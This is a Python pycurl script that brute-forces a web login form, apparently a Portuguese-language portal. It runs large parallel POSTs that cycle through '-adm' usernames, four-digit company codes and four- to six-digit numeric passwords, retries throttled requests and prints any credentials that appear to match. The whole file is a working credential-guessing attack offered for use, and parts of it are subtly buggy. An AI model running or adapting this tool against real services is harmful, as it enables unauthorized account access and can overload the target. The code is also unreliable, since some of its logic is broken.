from sys import exc_info
from queue import SimpleQueue
from dataclasses import dataclass
from re import compile as re_compile
from urllib.parse import urlencode
from typing import Callable, Union
from time import sleep
from argparse import ArgumentParser
import pycurl
''' Pycurl nosignal '''
try:
    import signal
    from signal import SIGPIPE, SIG_IGN
except ImportError:
    pass
else:
    signal.signal(SIGPIPE, SIG_IGN)


parser = ArgumentParser()
arg = parser.add_argument

arg('-c', '--company',
    help='Specify this company to bruteforce',
    default='',
    )
arg('-C', '--connections',
    help='Number of concomitant login request that libcurl will allow, this'
    + 'option will override max_handles, specify 0 to not impose any limit',
    type=int,
    default=0
    )
arg('-n', '--handles-number',
    help='Number of handles that will be simultaneously processed by libcurl'
    + 'this usually (but not necessarily) means that n handles will be'
    + 'processed simultaneously. To limit this behaviour, use --connections',
    type=int,
    default=1000,
    )
arg('-p', '--password',
    default='',
    )
arg('-t', '--trace',
    help='Enables a VERY verbose debug mode, that will set the VERBOSE'
    + 'option on libcurl, making it very aggressive to debug',
    action='store_true',
    default=False,
    )
arg('-u', '--user',
    help='Try to bruteforce with specified username',
    default='',
    )
arg('-v', '--verbose',
    help='Shows each received header or body from server, this will work if'
    + '--check-headers or --check-body is not in use',
    action='store_true',
    default=False,
    )
arg('-P', '--progress-level',
    help='Level of progress:\n1 - Prints progress from handles-number to'
    + 'handles-number attempts\n2 - Prints every attempt of bruteforce',
    type=int,
    default=1,
    )
arg('URL', help='URL to bruteforce')

args = parser.parse_args()

''' Regex to extract status code from response'''
status_regex = re_compile('HTTP/[0-9]\\.[0-9][A-z0-9]* ([0-9]*)')


@dataclass
class RetryFailedAttempts:
    __retryQueue: SimpleQueue

    def enqueue(self,
                user: str,
                password: str,
                company: str
                ) -> None:
        self.__retryQueue.put((user, password, company))

    def dequeue(self) -> "Union[tuple[str], None]":
        if (self.__retryQueue.empty()):
            return
        return self.__retryQueue.get()

    def dequeue_into_curl(self,
                          curlm: pycurl.CurlMulti,
                          add_request_callback: Callable
                          ) -> int:
        i = -1
        while (True):
            i += 1
            user, password, company = self.dequeue() or ('', '', '')
            is_queue_empty = bool(
                user == '' and password == '' and company == '')
            if (is_queue_empty):
                return i
            # else
            add_request_callback(curlm, user, password, company)


retryFailedAttempt = RetryFailedAttempts(SimpleQueue())

body_len_avg = []


def check_success_body(body_buffer: bytes,
                       user: str,
                       password: str,
                       company: str,
                       ) -> None:
    body: str = body_buffer.decode('utf-8')
    if (not body):
        print('******************** BODY ERROR ********************')
    body_len = len(body)
    if (len(body_len_avg == 2)):
        if (body_len > body_len_avg[0]):
            print(
                f''' Found Match:
                User: {user}
                Password: {password}
                Company: {company}
                HTTP body: {body}'''
            )

    if (len(body_len_avg) == 0):
        body_len_avg.append(body_len)
    elif (len(body_len_avg) == 1):
        body_len_avg.append(body_len)
        if (body_len_avg[0] != body_len_avg[1]):
            print(f'Special case where password might be {password} or a'
                  f'number less, that may apply to {company} or to {user}'
                  f', try a letter less in alphabetic order or a number'
                  )


def check_success_header(header_buffer: bytes,
                         user: str,
                         password: str,
                         company: str,
                         ) -> None:
    headers: str = header_buffer.decode('utf-8')
    if (not headers):
        print('******************** HEADERS ERROR ********************')
    status_code = status_regex.match(headers)
    if (status_code and len(status_code.groups()) > 0):
        status: str = status_code.groups()[0]
        if (status == '503'):
            retryFailedAttempt.enqueue(user, password, company)
        elif (status != '200'):
            print(
                f''' Found Match:
                User: {user}
                Password: {password}
                Company: {company}
                HTTP status: {status}'''
            )


def add_handle(curlm: pycurl.CurlMulti,
               user: str,
               password: str,
               company: str
               ) -> None:
    c = pycurl.Curl()
    if args.trace:
        trace_mode = 1
    else:
        trace_mode = 0
    c.setopt(pycurl.VERBOSE, trace_mode)
    if (not args.verbose):
        c.setopt(pycurl.WRITEHEADER, None)
        c.setopt(pycurl.WRITEFUNCTION, (lambda x: None))

    c.setopt(pycurl.NOSIGNAL, 1)
    # To have 302 status code on successful request header
    c.setopt(pycurl.FOLLOWLOCATION, 0)
    c.setopt(pycurl.HEADER, 1)
    c.setopt(pycurl.NOBODY, 0)
    c.setopt(pycurl.HEADERFUNCTION,
             # Pass username and password to get this information in case
             # we succeed
             lambda buffer: check_success_header(buffer,
                                                 user,
                                                 password,
                                                 company
                                                 )
             )
    c.setopt(pycurl.WRITEFUNCTION,
             # Pass username and password to get this information in case
             # we succeed
             lambda buffer: check_success_header(buffer,
                                                 user,
                                                 password,
                                                 company
                                                 )
             )
    c.setopt(pycurl.URL, args.URL)
    headers = ['User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko'
               + '/20100101 Firefox/78.0',
               'Accept: text/html,application/xhtml+xml,application/xml;'
               + 'q=0.9,image/webp,*/*;q=0.8',
               'Content-Type: application/x-www-form-urlencoded',
               ]
    c.setopt(pycurl.HTTPHEADER, headers)
    postfields = {'source': 'login',
                  'uid': user,
                  'upw': password,
                  'uemp': company,
                  'acessar': 'Acessar',
                  }
    c.setopt(pycurl.POSTFIELDS, urlencode(postfields))
    curlm.add_handle(c)


def four_numbers_generator() -> str:
    for i in range(0, 9999):
        yield str(i).rjust(4, '0')


def four_to_six_numbers_generator() -> str:
    for i in four_numbers_generator():
        yield i
    for i in range(0, 99999):
        yield str(i).rjust(5, '0')
    for i in range(0, 999999):
        yield str(i).rjust(6, '0')


def user_generator() -> str:
    lowerCase: 'list[str]' = [chr(i) for i in range(97, 97+26)]
    for i in lowerCase:
        for j in lowerCase:
            for k in lowerCase:
                yield i+j+k+'-adm'
                for l in lowerCase:
                    yield i+j+k+l+'-adm'
                    for m in lowerCase:
                        yield i+j+k+l+m+'-adm'
                        for n in lowerCase:
                            yield i+j+k+l+m+n+'-adm'

def multi_free_memory(curlm: pycurl.CurlMulti, force: bool = False) -> bool:
    while True:
        num_q, ok_list, err_list = curlm.info_read()
        for c in ok_list:
            curlm.remove_handle(c)
            c.close()
        for c, errno, errmsg in err_list:
            # if (errmsg):
            #    print(f'{errmsg}\nerrno = {errno}')
            if not force:
                return False
            else:
                curlm.remove_handle(c)
                c.close()
        if num_q == 0:
            break
    if force:
        curlm.close()
        curlm = pycurl.CurlMulti()
    return True

def multi_perform(curlm: pycurl.CurlMulti) -> bool:
    ''' returns false on failure '''
    # Run the internal curl state machine for the multi stack
    while True:
        ret = curlm.perform()
        if ret != pycurl.E_CALL_MULTI_PERFORM:
            break
    # Check for curl objects which have terminated
    return multi_free_memory

def bruteforce(has_user: 'Union[str, None]' = None,
               has_company: 'Union[str, None]' = None,
               has_password: 'Union[str, None]' = None,
               ) -> None:
    company_generator = four_numbers_generator
    password_generator = four_to_six_numbers_generator

    def users() -> str:
        if (has_user):
            return (yield has_user)
        # else
        for user in user_generator():
            yield user

    def companies() -> str:
        if (has_company):
            return (yield has_company)
        # else
        for company in company_generator():
            yield company

    def passwords() -> str:
        if (has_password):
            return (yield has_password)
        # else
        for password in password_generator():
            yield password

    pycurl.global_init(pycurl.GLOBAL_DEFAULT)
    try:
        curlm = pycurl.CurlMulti()
        curlm.setopt(pycurl.M_MAX_HOST_CONNECTIONS, args.connections)
        i = 0
        for user in users():
            for company in companies():
                for password in passwords():
                    if args.progress_level >= 2:
                        print(f'user = {user}\n password = {password}\n'
                              f'company = {company}')
                    add_handle(curlm, user, password, company)
                    i += 1
                    if (i >= args.handles_number):
                        i = retryFailedAttempt.dequeue_into_curl(curlm,
                                                                 add_handle,
                                                                 )
                        if (i):
                            print(f'Number of failed attempts: {i}')
                        if (args.progress_level >= 1):
                            print(f'attempt at {password}')
                        batch_processed = multi_perform(curlm)
                        retries = 3
                        while (not batch_processed):
                            sleep(1)
                            batch_processed = multi_perform(curlm)
                            retries -= 1
                            if (retries <= 0):
                                retries = 0
                                multi_free_memory(curlm, force=True)
                                break
    except Exception as e:
        print(f'Unexpected error: {exc_info()[0]}')
        raise(e)
    finally:
        pycurl.global_cleanup()


if (__name__ == '__main__'):
    bruteforce(args.user or None,
               args.company or None,
               args.password or None)
